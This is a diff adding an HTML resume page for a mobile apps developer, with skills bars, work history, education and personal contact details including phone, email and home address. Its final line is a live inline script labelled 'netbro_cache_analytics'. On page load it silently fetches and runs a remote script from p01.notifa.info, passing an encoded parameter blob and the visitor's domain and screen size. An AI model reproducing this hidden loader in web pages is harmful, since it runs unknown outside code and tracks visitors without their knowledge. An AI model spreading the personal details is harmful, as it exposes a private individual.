@@ -1,0 +1,557 @@
+
+<!DOCTYPE html>
+<!--[if IE 7]><html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]><html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+
+        <!-- TITLE OF SITE-->
+        <title>Redha Putra</title>
+
+        <!-- META TAG -->
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="CV, Portfolio, Resume">
+        <meta name="author" content="Redha Putra">
+
+        <!-- FAVICON -->
+        <link rel="icon" href="assets/images/favicon.ico">
+        <link rel="apple-touch-icon" sizes="72x72" href="assets/images/apple-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="assets/images/apple-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="assets/images/apple-icon-114x114.png">
+
+        <!-- ========================================
+                Stylesheets
+        ==========================================-->
+
+        <link href="http://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+        <!-- MATERIALIZE CORE CSS -->
+        <link href="assets/css/materialize.min.css" rel="stylesheet">
+
+
+        <!-- ADDITIONAL CSS -->
+        <link rel="stylesheet" href="assets/css/animate.css">
+
+
+        <!-- FONTS -->
+        <link href='http://fonts.googleapis.com/css?family=Roboto:400,100,300,700,400italic,700 italic' rel='stylesheet' type='text/css'>
+
+
+        <!--FONTAWESOME CSS-->
+        <link href="assets/icons/font-awesome-4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+        <!-- CUSTOM STYLE -->
+        <link href="assets/css/style.css" rel="stylesheet">
+
+
+        <!-- RESPONSIVE CSS-->
+        <link href="assets/css/responsive.css" rel="stylesheet">
+
+        <!-- COLORS -->
+        <!--<link rel="stylesheet" href="assets/css/colors/lime.css" title="lime">  &lt;!&ndash; Currently Using this color &ndash;&gt;-->
+         <!--<link rel="alternate stylesheet" href="assets/css/colors/red.css" title="red">-->
+         <!--<link rel="stylesheet" href="assets/css/colors/purple.css" title="purple">-->
+         <!--<link rel="stylesheet" href="assets/css/colors/orange.css" title="orange">
+         <!--<link rel="stylesheet" href="assets/css/colors/green.css" title="green">-->
+
+        <!--[if lt IE 9]><script src="assets/js/ie8-responsive-file-warning.js"></script><![endif] -->
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+          <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+        <![endif]-->
+
+        <script type="text/javascript">
+            function getAge(birthDate) {
+              var now = new Date();
+
+              function isLeap(year) {
+                return year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
+              }
+
+              // days since the birthdate
+              var days = Math.floor((now.getTime() - birthDate.getTime())/1000/60/60/24);
+              var age = 0;
+              // iterate the years
+              for (var y = birthDate.getFullYear(); y <= now.getFullYear(); y++){
+                var daysInYear = isLeap(y) ? 366 : 365;
+                if (days >= daysInYear){
+                  days -= daysInYear;
+                  age++;
+                  // increment the age only if there are available enough days for the year.
+                }
+              }
+              return age;
+            }
+        </script>
+
+    </head>
+    <body>
+        <!-- Start Container-->
+        <div class="container">
+            <!-- row -->
+            <div class="row">
+            <!-- =========================================
+                           SIDEBAR
+            ==========================================-->
+                <!-- Start Sidebar -->
+                <aside class="col l4 m12 s12 sidebar z-depth-1" id="sidebar">
+                    <!--  Sidebar row -->
+                    <div class="row">
+                        <!--  top section   -->
+                        <div class="heading">
+                            <!-- ======================================
+                                      IMAGE
+                            =========================================-->
+                            <div class="feature-img">
+                                <img src="assets/images/redha-putra.jpg" class="responsive-img" alt="">
+                            </div>
+                            <!-- =========================================
+                                       NAVIGATION
+                            ==========================================-->
+                            <div class="nav-icon ">
+                                <nav>
+                                    <div class="nav-wrapper">
+                                      <ul id="nav-mobile" class="side-nav">
+                                        <li><a href="index.html">Resume</a></li>
+                                        <li><a href="project.html">Projects</a></li>
+                                      </ul>
+
+                                    <a href="#" data-activates="nav-mobile" class="btn btn-floating pulse fungsinav" style="margin-left: -3px">
+                                        <i class="material-icons" style="margin-top: -12px;font-size: 24px">menu</i>
+                                    </a>
+
+                                    </div>
+                                </nav>
+                            </div>
+
+
+
+                        </div>
+
+                           <!-- ========================================
+                                       NAME AND TAGLINE
+                            ==========================================-->
+                        <div class="col l12 m12 s12  mobile sidebar-item">
+                            <div class="row title col center" style="margin-left: 35px;margin-top: -10px">
+                                <h2>Redha Putra</h2> <!-- title name -->
+                                <h5>Mobile Apps Developer</h5>  <!-- tagline -->
+                            </div>
+                        </div>
+
+                        <!-- DATE OF Birth -->
+                        <div class="col l12 m12 s12  mobile sidebar-item">
+                            <div class="row">
+                                <div class="col m12 s12 l3 icon">
+                                    <i class="fa fa-calendar-o"></i> <!-- icon -->
+                                </div>
+                                <div class="col m12 s12 l9 info wow fadeIn a1" data-wow-delay="0.2s" >
+                                    <div class="section-item-details">
+                                        <div class="personal">
+                                            <h4>
+                                            <a href="#">6 Dec 1992</a><br>
+                                            <!--<span>26 years</span></h4>-->
+                                            <script type="text/javascript">
+                                                var birthDateStr = '19921206',
+                                                parts = birthDateStr.match(/(\d{4})(\d{2})(\d{2})/),
+                                                dateObj = new Date(parts[1], parts[2]-1, parts[3]); // months 0-based!
+
+                                                //alert(getAge(dateObj));
+                                                document.write("<span>"+getAge(dateObj)+" years</span>") ;
+                                            </script>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- MOBILE NUMBER -->
+                        <div class="col l12 m12 s12  mobile sidebar-item">
+                            <div class="row">
+                                <div class="col m12 s12 l3 icon">
+                                    <i class="fa fa-mobile"></i> <!-- icon -->
+                                </div>
+                                <div class="col m12 s12 l9 info wow fadeIn a1" data-wow-delay="0.2s" >
+                                    <div class="section-item-details">
+                                        <div class="personal">
+                                            <h4><a href="tel:082123081949">082123081949</a></h4> <!-- Number -->
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!--  EMAIL -->
+                        <div class="col l12 m12 s12  email sidebar-item ">
+                            <div class="row">
+                                <div class="col m12 s12 l3 icon">
+                                    <i class="fa fa-envelope"></i> <!-- icon -->
+                                </div>
+                                <div class="col m12 s12 l9 info wow fadeIn a2" data-wow-delay="0.3s">
+                                    <div class="section-item-details">
+                                        <div class="personal">
+                                            <h4>
+                                                <a href="mailto:putra.redha@gmail.com">putra.redha@gmail.com</a> <br>
+                                                <span>personal</span>
+                                            </h4>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- ADDRESS  -->
+                        <div class="col l12 m12 s12  address sidebar-item ">
+                            <div class="row">
+                                <div class="col l3 m12  s12 icon">
+                                    <i class="fa fa-home"></i> <!-- icon -->
+                                </div>
+                                <div class="col m12 s12 l9 info wow fadeIn a5" data-wow-delay="0.4s">
+                                    <div class="section-item-details">
+                                        <div class="address-details"> <!-- address  -->
+                                            <h4>Jalan Salak Raya no 161, Pancoran Mas, Depok<br>
+                                            <span>Address</span></h4>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SKILLS -->
+                        <div class="col l12 m12 s12  skills sidebar-item" >
+                            <div class="row">
+                                <div class="col m12 l3 s12 icon">
+                                    <i class="fa fa-code"></i> <!-- icon -->
+                                </div>
+                                 <!-- Skills -->
+                                <div class="col m12 l9 s12 skill-line a8 wow fadeIn" data-wow-delay="0.5s">
+                                    <h3>Skills</h3>
+
+                                    <span>Kotlin</span>
+                                    <div class="progress">
+                                        <div class="determinate">95%</div>
+                                    </div>
+
+                                    <span>Swift</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>SwiftUI</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>JavaScript</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>Android</span>
+                                    <div class="progress">
+                                        <div class="determinate">95%</div>
+                                    </div>
+
+                                    <span>Modular</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>MVVM</span>
+                                    <div class="progress">
+                                        <div class="determinate">95%</div>
+                                    </div>
+
+                                    <span>React Native</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>React Js</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>Redux</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>Node Js</span>
+                                    <div class="progress">
+                                        <div class="determinate">75%</div>
+                                    </div>
+
+                                    <span>Mongo DB</span>
+                                    <div class="progress">
+                                        <div class="determinate">70%</div>
+                                    </div>
+
+                                    <span>MySQL</span>
+                                    <div class="progress">
+                                        <div class="determinate">70%</div>
+                                    </div>
+
+                                    <span>Google Cloud Platform</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>Firebase</span>
+                                    <div class="progress">
+                                        <div class="determinate">95%</div>
+                                    </div>
+
+                                    <span>PostgreSQL</span>
+                                    <div class="progress">
+                                        <div class="determinate">70%</div>
+                                    </div>
+
+                                    <span>SQLite</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>PHP</span>
+                                    <div class="progress">
+                                        <div class="determinate">70%</div>
+                                    </div>
+
+                                    <span>CSS</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>HTML</span>
+                                    <div class="progress">
+                                        <div class="determinate"> 90%</div>
+                                    </div>
+
+                                    <span>Microsoft Office</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+
+                                    <span>Test Driven Development</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>Mobile Applications</span>
+                                    <div class="progress">
+                                        <div class="determinate">100%</div>
+                                    </div>
+
+                                    <span>Mobile Application Development</span>
+                                    <div class="progress">
+                                        <div class="determinate">100%</div>
+                                    </div>
+
+                                    <span>Web Development</span>
+                                    <div class="progress">
+                                        <div class="determinate">80%</div>
+                                    </div>
+
+                                    <span>Backend Development</span>
+                                    <div class="progress">
+                                        <div class="determinate">70%</div>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Language -->
+                        <div class="col l12 m12 s12  skills sidebar-item" >
+                            <div class="row">
+                                <div class="col m12 l3 s12 icon">
+                                    <i class="fa fa-language"></i> <!-- icon -->
+                                </div>
+                                 <!-- Skills -->
+                                <div class="col m12 l9 s12 skill-line a8 wow fadeIn" data-wow-delay="0.5s">
+                                    <h3>Languages</h3>
+
+                                    <span>Indonesia</span>
+                                    <div class="progress">
+                                        <div class="determinate">95%</div>
+                                    </div>
+
+                                    <span>Inggris</span>
+                                    <div class="progress">
+                                        <div class="determinate">90%</div>
+                                    </div>
+                                    <br>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Sosmed -->
+                         <div class="col l12 m12 s12 skills sidebar-item" >
+                            <div class="row">
+                                <div class="col m12 l3 s12 icon">
+                                    <i class="fa fa-bullseye"></i> <!-- icon -->
+                                </div>
+
+                                <div class="col m12 l9 s12 skill-line a8 wow fadeIn" data-wow-delay="0.5s">
+                                    <h3>Find me on</h3>
+
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col l12 m12 s12 skills sidebar-item" style="margin-top: -18px">
+                            <div class="row">
+                                <div class="col m12 l12 s12 skill-line a8 wow fadeIn" data-wow-delay="0.5s">
+
+                                    <div class="col m4 l4 s4 icon ">
+                                        <center>
+                                            <a href="https://www.instagram.com/redhaputraa/" target="__BLANK">
+                                                <i class="fa fa-instagram "></i><br />
+                                                Instagram
+                                            </a>
+                                        </center>
+                                    </div>
+                                    <div class="col m4 l4 s4 icon ">
+                                        <center>
+                                            <a href="https://www.linkedin.com/in/redha-putra-94a234154/" target="__BLANK">
+                                                <i class="fa fa-wordpress "></i><br />
+                                                LinkedIn
+                                            </a>
+                                        </center>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+
+
+                    </div>   <!-- end row -->
+
+                </aside><!-- end sidebar -->
+
+
+                <section class="col s12 m12 l8 section">
+                    <div class="row">
+                        <!-- =========================================
+                           Work experiences
+                        ==========================================-->
+                        <div class="section-wrapper z-depth-1">
+                            <div class="section-icon col s12 m12 l2">
+                                <i class="fa fa-briefcase"></i>
+                            </div>
+                            <div class="custom-content col s12 m12 l10 wow fadeIn a2" data-wow-delay="0.1s">
+                                <h2>Work Experience</h2>
+                                <div class="custom-content-wrapper wow fadeIn a3" data-wow-delay="0.2s">
+                                    <h3>Freelance <span style="float: right;">2015 - 2017</span></h3>
+                                    <span>Web Developer</span>
+                                    <p>
+                                        From 3rd semester of my study, I worked as web developer freelancer. 
+                                        I took website development project around my university using 
+                                        HTML, CSS, JS, and PHP as a language.<br/>
+                                    </p>
+                                    <b>Accomplishment</b>
+                                    <ol>
+                                        <li><a href="http://rentalmobilfebri.esy.es" target="__BLANK">Febri Car rent</a>.</li>
+                                        <li><a href="https://kelurahansawangan.000webhostapp.com" target="__BLANK">Kelurahan Sawangan</a>.</li>
+                                    </ol>
+                                </div>
+                                <div class="custom-content-wrapper wow fadeIn a5" data-wow-delay="0.2s">
+                                    <h3>PT. Qlue Performa Indonesia <span style="float: right;">Dec 2017 - NOW</span></h3>
+                                    <span>Mobile Apps Developer (Kotlin, Swift, React Native)</span>
+                                    <p>
+                                        After taking Full Stack JavaScript course at Hactiv8, 
+                                        I was working at technology company called PT. Qlue Performa Indonesia as a 
+                                        mobile developer using React Native, swift and Kotlin as programming language.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- ========================================
+                         Education
+                        ==========================================-->
+                        <div class="section-wrapper z-depth-1">
+                            <div class="section-icon col s12 m12 l2">
+                                <i class="fa fa-graduation-cap"></i>
+                            </div>
+                            <div class="custom-content col s12 m12 l10 wow fadeIn a6" data-wow-delay="0.1s" >
+                                <h2>Education</h2>
+                                <div class="custom-content-wrapper wow fadeIn a9" data-wow-delay="0.3s" >
+                                    <h3>Telkom University <span style="float: right;">2010 - 2014</span></h3>
+                                    <span>D3 Informatics Management</span>
+                                    <p class="dis">
+                                        <a href="https://www.google.com/maps/place/Telkom+University/@-6.973007,107.4916097,12z/data=!4m10!1m2!2m1!1stelkom+universit!3m6!1s0x2e68e9adf177bf8d:0x437398556f9fa03!8m2!3d-6.973007!4d107.6316854!15sChB0ZWxrb20gdW5pdmVyc2l0IgOIAQGSARJwcml2YXRlX3VuaXZlcnNpdHngAQA!16s%2Fm%2F0y6lbq_" target="__BLANK">
+                                            Jl. Telekomunikasi. 1, Terusan Buahbatu - Bojongsoang, Telkom University, Sukapura, Kec. Dayeuhkolot, Kabupaten Bandung, Jawa Barat 40257
+                                        </a>
+                                    </p>
+                                    
+                                    <h3>Gunadarma University <span style="float: right;">2014 - 2017</span></h3>
+                                    <span>S1 Information System</span>
+                                    <p class="dis">
+                                        <a href="https://www.google.com/maps/place/Universitas+Gunadarma+Kampus+D/@-6.2487816,105.8501071,9z/data=!4m10!1m2!2m1!1sgunadarma!3m6!1s0x2e69ed01b68548ad:0x89aea3afc2b2e77d!8m2!3d-6.3691146!4d106.8331944!15sCglndW5hZGFybWGSARJwcml2YXRlX3VuaXZlcnNpdHngAQA!16s%2Fg%2F11r_tyb614">
+                                            JRJM+974, Pondok Cina, Beji, Depok City, West Java
+                                        </a>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- ========================================
+                         Organization, Course & Bootcamp
+                        ==========================================-->
+                        <div class="section-wrapper z-depth-1">
+                            <div class="section-icon col s12 m12 l2">
+                                <i class="fa fa-graduation-cap"></i>
+                            </div>
+                            <div class="custom-content col s12 m12 l10 wow fadeIn a6" data-wow-delay="0.1s" >
+                                <h2>Organization Experience and Course</h2>
+                                <div class="custom-content-wrapper wow fadeIn a9" data-wow-delay="0.3s" >
+                                    <h3>SMP Labschool Cinere <span style="float: right;">2005 - 2006</span></h3>
+                                    <span>Majelis Permusyawaratan Kelas (MPK)</span>
+                                    <p class="dis">MPK supervising OSIS work. My position in MPK is co-leader.</p>
+                                    
+                                    <h3>HTML 5 Application Development Fundamentals (Microsoft Certificate) <span style="float: right;">2015</span></h3>
+                                    <span>Gunadarma University</span>
+                                    <p class="dis">
+                                        <a href="https://drive.google.com/file/d/1N7ogZlmFYqjNGeUAfLprRGXsobY52xEn/view?usp=sharing">
+                                            Online Certificate
+                                        </a>
+                                    </p>
+
+                                    <h3>Full Stack Javascript Immersive <span style="float: right;">2017</span></h3>
+                                    <span>Hactiv8</span>
+                                    <p class="dis">I graduated as a Honor Student (total score 90 - 99 /100).</p>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div><!-- end row -->
+                </section><!-- end section -->
+            </div> <!-- end row -->
+        </div>  <!-- end container -->
+
+        <!--=====================
+            JavaScript
+        ===================== -->
+
+        <!-- Jquery core js-->
+        <script src="assets/js/jquery.min.js"></script>
+
+        <!-- materialize js-->
+        <script src="assets/js/materialize.min.js"></script>
+
+        <!-- wow js-->
+        <script src="assets/js/wow.min.js"></script>
+
+        <!-- Masonry js-->
+        <script src="assets/js/masonry.pkgd.js"></script>
+
+        <!-- Customized js -->
+        <script src="assets/js/init.js"></script>
+
+
+
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mj91pTgP7wf7c867zBb9Bvx3u8Y%2fb5cc50NPTnKlDCDLpvDmNWrR2tKjRF%2bBECRH%2bTT%2bleBi0WC7qIlT7BEXTjj00YQVrJu1eNhWlGZRc2fy7xyfFaSCsCbFvrIREq1XH1533PdDpcyN4W5r%2bbMFytb2ZBZ8%2fJuihxU4%2bcd8LD628CKKvgdZQmTderPVY0cxIZlPBQQeBgP5pgY1e1iuzElotzttTXepSIokVtDtrN%2frf55fR8uw8a9XjqxYa0keA38sEgY7AK0c1Kztb%2fZK4aHqBYqcc1KOCNI1fnnnm57%2bJog8Ee8aPOx2jLwTc9bCf%2bFyum%2bfYGyqTm6RwUDZGsBZgUeLxFuWSWIwECwSk4s9F15r%2bENCEa9rKSTB6XEFoRsOp1mR%2fNO12%2fmttvXM9JXmtbHXWxGoareDyBpbUyTQm6NnTxc7hsENKIx43Wb4hTQHPLa%2bRIwAVE09wPPtGljyNGVdAXnJzXiP1WdlV5ncimfCNxNVR1mDLBPqe0AUSJ5MQ28yyzAtaEf8P%2fNhH4X35XpikD3ZelSW9MPw3LcFazMn1JTSwCQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
